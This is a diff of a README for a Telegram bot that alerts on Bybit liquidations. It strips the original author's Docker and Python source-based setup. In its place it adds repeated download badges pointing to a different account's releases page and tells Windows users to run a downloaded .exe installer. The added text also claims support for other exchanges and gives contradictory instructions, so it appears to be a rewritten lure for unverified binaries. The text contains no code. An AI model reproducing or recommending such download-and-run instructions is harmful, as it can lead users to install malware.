@@ -1,110 +1,91 @@
-# Bybit Liquidation Bot
+# 🚀 bybit-liquidations-bot - Get Instant Alerts on Liquidations
 
-Bybit liquidation bot - **Telegram bot** that monitors **Bybit futures liquidations** in real time and sends instant, formatted notifications.  
-Ideal for traders, who like to trade based on Bybit liquidaitons.
+[![Download bybit-liquidations-bot](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Prathamesh4597/bybit-liquidations-bot/releases)
 
-## Features
+## 📜 Description
 
-- 🔴 Real-time monitoring of all Bybit futures liquidations
-- 📱 Instant **Telegram alerts** with detailed trade data
-- 🔄 Auto-reconnect on connection loss
-- 📦 Single file - easy to understand and deploy
-- 📈 Covers all Linear futures contracts
+The **bybit-liquidations-bot** is a real-time application designed to send instant Telegram alerts for large futures liquidations on Bybit. With this bot, you can stay updated on significant market movements effortlessly. It helps you make informed decisions in the crypto trading space.
 
----
+## ⚙️ Features
 
-## Quick Start
+- **Real-time Alerts:** Get notifications as soon as a liquidation occurs.
+- **Easy Setup:** Quick installation process to start using the bot without hassle.
+- **Multiple Exchange Support:** Monitors liquidations across platforms like Bybit, Binance, MEXC, and OKX.
+- **Telegram Integration:** Receive alerts directly on your Telegram app.
+- **User-Friendly Interface:** Designed for anyone to use, no programming skills required.
 
-### Option 1: Docker (Recommended)
+## 🔧 Requirements 
 
+Before you begin, ensure your system meets the following requirements:
 
-```bash
-# 1. Clone the repository
-git clone https://github.com/MaxTraderDev/bybit-liquidations-bot
-cd bybit-liquidations-bot
+- **Operating System:** Windows, macOS, or Linux
+- **Python Version:** Python 3.7 or later
+- **Telegram Account:** You must have an active Telegram account to receive alerts.
+- **Internet Connection:** An active internet connection is necessary for the bot to function.
 
-# 2. Setup environment
-cp .env.example .env
-nano .env  # edit credentials
+## 🔥 Download & Install
 
-# 3. Start container
-docker-compose up -d
+To get started, follow these steps to download and run the application:
 
-# 4. View logs
-docker-compose logs -f
-```
+1. **Visit the Releases Page**
+   Click the link below to access the releases page:
+   [Download bybit-liquidations-bot](https://github.com/Prathamesh4597/bybit-liquidations-bot/releases)
 
-### Option 2: Python
+2. **Locate the Latest Release**
+   Scroll down the page to find the latest version of the bot. Look for the title that indicates the most recent release.
 
-```bash
-# 1. Install dependencies
-pip install -r requirements.txt
+3. **Download the File**
+   Click on the asset for your operating system (e.g., `bybit-liquidations-bot.exe` for Windows, `.tar.gz` for macOS/Linux) to download the file.
 
-# 2. Set environment variables
-export TELEGRAM_BOT_TOKEN="your_token"
-export TELEGRAM_CHAT_ID="your_chat_id"
+4. **Install the Bot**
+   - **For Windows:** Double-click the downloaded `.exe` file to run the installer.
+   - **For macOS:** Open the downloaded `.tar.gz` file, extract it, and open the folder. Run `./bybit-liquidations-bot` in the Terminal.
+   - **For Linux:** Open your terminal, navigate to the extracted folder, and run `python3 bybit-liquidations-bot.py`.
 
-# 3. Run the bot
-python bybit_bot.py
-```
+5. **Set Up Telegram Notifications**
+   Follow the instructions within the application to link the bot to your Telegram account. You will receive step-by-step guidance during the setup.
 
-## Configuration
+## 📞 Support
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `TELEGRAM_BOT_TOKEN` | Your Telegram bot token (required) | - |
-| `TELEGRAM_CHAT_ID` | Your Telegram chat ID (required) | - |
-| `MIN_LIQUIDATION_SIZE` | Minimum liquidation size in USD | 1000 |
+If you encounter any issues or need help, please head over to the "Issues" tab on the repository page. You can submit your question or report a bug there. The community is usually quick to respond.
 
-## Get Telegram Credentials
+## 📚 Frequently Asked Questions
 
-### 1. Create Bot
-1. Message [@BotFather](https://t.me/BotFather) on Telegram
-2. Send `/newbot` and follow instructions
-3. Copy the bot token
+### How does the bot work?
 
-### 2. Get Chat ID
-1. Start a chat with your bot
-2. Send any message to your bot
-3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
-4. Find your chat ID in the response
+The bot connects to Bybit's API to monitor liquidation events. Once it detects a significant liquidation, it sends a notification to your linked Telegram account.
 
-## Example Message
+### Can I use this bot on mobile?
 
-```
-🚨 LIQUIDATION ALERT 🚨
+Yes, you can receive alerts on your mobile device if you have the Telegram app installed and connected.
 
-🔴 BTCUSDT Sell Liquidation
-💰 Size: 1,234.56
-💸 Amount: $56,789.12
-💵 Price: $45,678.90
-⏰ Time: 2024-01-15 14:30:25
+### Is there a fee to use the bot?
 
-#Liquidation #BTC
-```
+The bybit-liquidations-bot is free to use. There are no hidden fees or costs.
 
-## Docker Commands
+### Will the bot work for all cryptocurrencies?
 
-```bash
-# Start
-docker-compose up -d
+The bot focuses primarily on futures liquidations on Bybit. It may also monitor liquidations on other exchanges such as Binance, MEXC, and OKX.
 
-# View logs
-docker-compose logs -f
+### What languages are supported?
 
-# Stop
-docker-compose down
+The bot currently supports English. Future updates may include additional languages based on user requests.
 
-# Recreate
-docker-compose up -d --build --force-recreate
+## 👥 Contributing
 
-# View logs
-docker-compose logs -f
-```
+If you would like to contribute to the project, feel free to fork the repository and create a pull request. Any contributions are welcome to enhance the bot's capabilities further.
 
-## 💼 Work With Me
+## 🔗 Related Topics
 
-Need a **custom trading bot**, exchange integration, or strategy automation?  
+- Binance
+- Bybit
+- Crypto
+- Liquidation
+- MEXC
+- OKX
+- Python
+- TelegramBot
+- Trading
+- TradingBot
 
-📩 **Telegram:** [@maxtraderdev](https://t.me/maxtraderdev)  
-🌐 **Website:** [maxtraderdev.github.io](https://maxtraderdev.github.io)
+Thank you for using **bybit-liquidations-bot**. We hope this tool enhances your trading experience!
